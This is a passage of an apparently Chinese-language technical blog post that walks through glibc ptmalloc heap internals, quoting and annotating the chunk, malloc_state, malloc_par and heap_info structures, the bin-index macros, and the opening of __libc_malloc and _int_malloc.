+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line"><span class="comment">//free chunk</span></span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of previous chunk                            |</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:<span class="string">&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="string">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">    .                                                               .</span></span><br><span class="line"><span class="string">    .                                                               |</span></span><br><span class="line"><span class="string">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    `foot:&#x27;</span> |             Size of chunk, in bytes                           |</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><code>prev_size</code>，当前的<code>chunk</code>为<code>free</code>的时候，表示物理相邻的前一个<code>chunk</code>的大小，并可以通过这个大小找到前一个<code>chunk</code>的起始位置。当该块为<code>use</code>的时候，该位可以被前一块的数据占用。</li><li><code>size</code>表示当前<code>chunk</code>的大小，由于<code>size</code>最小需要<code>8</code>字节对齐，因此其低<code>3</code>空闲，分别用作<code>falg</code>即<code>NMP</code>，其中<code>N</code>表示的是当前的<code>chunk</code>是否属于主进程，<code>M</code>表示的是当前的<code>chunk</code>是否是由<code>mmap</code>分配的<code>P</code>表示的是前一个<code>chunk</code>是否是空闲的。最开始的一个<code>chunk</code>该位总是置<code>1</code>，防止引用不存在的内存地址。</li><li><code>fd</code>当<code>chunk</code>空闲时，指向下一个空闲的<code>chunk</code>，<code>bk</code>指向上一个空闲的<code>chunk</code></li><li><code>fd_nextsize</code>当为<code>largebin</code>的时候才是用，指向下一个与当前的<code>chunk</code>大小不同的<code>chunk</code>，<code>largebin</code>链表中相同大小的一组<code>chunk</code>仅第一块<code>chunk</code>的<code>fd_nextsize,bk_nextsize</code>指向下一个和上一个与当前大小不同的堆块，其余的<code>chunk</code>该位为空。</li></ul><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p><code>malloc_state</code>是非常常用的一个结构体了，通常用<code>mstate</code>来表示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;<span class="comment">//互斥锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;<span class="comment">//标志位，用来表示当前的arena中是否存在fastbin或者内存是否连续等</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];<span class="comment">//存放每一个fastbin链表的头指针，最多支持的bin的个数为10个</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;<span class="comment">//top chunk堆顶</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;<span class="comment">//指向上一个chunk分配出一个small chunk之后剩余的部分</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];<span class="comment">//存储unsorted_bin,small_bin.large_bin的链表头</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];<span class="comment">//每一个bit表示对应的bin中是否存在空闲chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;<span class="comment">//当前内存的分配量</span></span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个分配区是一个<code>malloc_state</code>结构体的实例，<code>ptmalloc</code>使用这个结构体来管理每一个分配区，而参数的管理使用的是<code>malloc_par</code>结构体，全局拥有一个该结构体的实例。</p><blockquote><p>分配区是为了加速多线程分配内存而引入的。主分配区和子分配区形成一个环形链表，每一个线程中都存在一个私有的变量存放分配区指针，在分配内存的时候，查看那个分配区没有上锁，即在哪个分配区分配内存，如果分配区全部被占用，则建立一个新的分配区。</p><p>对于sbrk和mmap两种分配方式，主分配区都可以实现。相对的子分配区则是预先mmap申请一块较大的内存。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure><p>针对<code>fastbin</code>中最大的<code>bin</code>，对<code>32</code>为系统来说，其数据空间最大为<code>80</code>字节，对<code>64</code>位系统来说其最大的数据空间为<code>160</code>字节。注意这里的数据空间都不不包含<code>chunk</code>头部的。</p><p><code>bins</code>变量中存储了<code>unsorted_bin，small_bin（62），large_bin（63）</code>的链表头指针，其中<code>bins[0],bins[127]</code>都不存在，<code>bins[1]</code>中存储了<code>unsorted_bin</code>的<code>chunk</code>的链表头部，<code>mchunkptr</code>是<code>malloc_chunk</code>的结构体指针。</p><ul><li><p><code>small bin</code>，从<code>small bin</code>定义的宏来看，其数组下标<code>index</code>与存储的<code>chunk</code>的大小的关系是：<code>chunk_size = MALLOC_ALIGNMENT *index</code>，其中<code>MALLOC_ALIGNMENT=2 * SIZE_SZ</code>。对<code>32</code>位系统来说，其最大的<code>chunk</code>的大小为<code>504</code>字节，<code>64</code>位为<code>1008</code>字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure></li><li><p><code>large bin</code>，共包含<code>63</code>个<code>bin</code>， 每个<code>bin</code>中的<code>chunk</code>的大小不一致，而是出于一定的范围之内，此外这<code>63</code>个<code>bin</code>被分成了<code>6</code>组，每组<code>bin</code>的<code>chunk</code>的大小之间的公差一致。</p><p><code>largebin</code>排列方式为从大到小依次排列，链表头的<code>bk</code>指针指向最小的堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure></li></ul><p><code>binmap</code>中的每一位表示对应的<code>bin</code>中是否存在空闲的<code>chunk</code>，<code>4</code>个<code>block</code>来管理，每个<code>block</code>有<code>4</code>个字节，也就是<code>128</code>个<code>bit</code>。</p><h2 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;<span class="comment">//收缩阈值</span></span><br><span class="line">  INTERNAL_SIZE_T top_pad;<span class="comment">//分配内存时是否添加额外的pad，默认为0</span></span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;<span class="comment">//mmap的分配阈值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_test;<span class="comment">//最小分配区</span></span><br><span class="line">  INTERNAL_SIZE_T arena_max;<span class="comment">//最大分配区</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;<span class="comment">//当前进程使用mmap()分配的内存块的个数</span></span><br><span class="line">  <span class="type">int</span> n_mmaps_max;<span class="comment">//可以使用mmap()分配的内存块的最大数量</span></span><br><span class="line">  <span class="type">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;<span class="comment">//是否开启mmap分配阈值动态调整，0表示开启，默认为0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;<span class="comment">//mmap分配的内存大小</span></span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  sbrked_mem;*/</span></span><br><span class="line">  <span class="comment">/*INTERNAL_SIZE_T  max_sbrked_mem;*/</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;<span class="comment">//mmap分配的内存大小，一般与mmaped_mem相等</span></span><br><span class="line">  INTERNAL_SIZE_T max_total_mem;  <span class="comment">/* only kept for NO_THREADS */</span><span class="comment">//单线程情况下统计进程分配的内存总数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>thrim_threshold</code>字段表示收缩阈值，默认为<code>128KB</code>，当<code>top chunk</code>的大小大于这个阈值的时候，在调用<code>free</code>函数的时候可能会缩小<code>top chunk</code>，收缩内存。收缩阈值可以通过<code>mallocopt</code>函数设置。由于<code>mmap</code>分配阈值动态调整，<code>free</code>函数最大可以将收缩阈值设置为分配阈值的<code>2</code>倍。</li><li><code>mmap_threshold</code>表示分配阈值，默认值为<code>128KB</code>，<code>32</code>位系统中最大值为<code>512KB</code>，<code>64</code>位系统中的最大值为<code>32MB</code>。默认开启了<code>mmap</code>分配阈值的动态调整，但是不会超过最大值。</li><li><code>arena_test</code>和<code>arena_max</code>，当每个进程中的分配区的数量大于<code>arena_max</code>的时候不会创建新的分配区，当分配区数量小于<code>arena_test</code>的时候不会重用现有的分配区。</li></ul><h2 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">    <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">    <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">    <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">    <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><p>该结构体主要是为了非主线程分配内存使用的，也就是在非主分配区分配内存。因为主分区分配内存可以直接使用<code>sbrk</code>方式扩展内存，只有一个堆。而非主线程的<code>heap</code>是提前分配好的，因此当该<code>heap</code>资源用完时，就需要重新申请内存空间，因为一般情况下申请的内存空间是不连续的，因此需要记录一个线程中不同的<code>heap</code>的链接结构。</p><ul><li><code>ar_ptr</code>表示该堆所对应的分配区</li><li><code>prev</code>该线程的上一个堆结构，注意到这里是采用单链表的形式来记录一个线程的所有堆结构的。</li><li><code>size</code>堆的大小</li></ul><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>程序调用的<code>malloc</code>函数也就是<code>__libc_malloc</code>函数，如果分配堆空间成功会返回一个新分配的<code>chunk</code>的指针，如果空间不足则返回的是<code>NULL</code>指针，出现错误的时候会将<code>errno</code>设置为相应的数值。这里需要注意的是当分配空间的大小是<code>0</code>的时候，<code>malloc</code>函数也会分配一个最小的<code>chunk</code>。看一下<code>malloc</code>的具体代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从函数流程中我们可以看出，首先函数先检查了<code>malloc_hook</code>是否被设置，若被设置，则直接调用<code>malloc_hook</code>。若未被设置，则首先调用<code>arena_get</code>函数获取一个可用的分配区，然后调用<code>_int_malloc</code>函数，该函数是堆块分配的主函数。</p><p>如果<code>_int_malloc</code>函数返回的<code>chunk</code>的指针为空，且当前的分配区指针不为空，则再次尝试<code>_int_malloc</code>。对分配之后的<code>chunk</code>指针进行地址检查，检查是否为<code>mmap</code>并存在于当前分配区的<code>chunk</code>。</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">    mmap.  */</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>首先是将传入的参数的大小设置为对齐，并判断传入的参数大小是否符合要求（若小于最小的<code>chunk</code>，则<code>size</code>为最小的<code>chunk</code>）然后检查传入的<code>malloc_state</code>结构体，若是当前没有可用的分配区，或者是第一次分配，则调用<code>sysmalloc</code>函数分配内存。这里需要注意的是第一次调用<code>malloc</code>的时候<code>malloc_hook</code>不为空其值为<code>malloc_hook_ini</code>函数，通过调用<code>_init_malloc</code>实现了一些初始化的操作，在后面详细分析该函数。</p><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  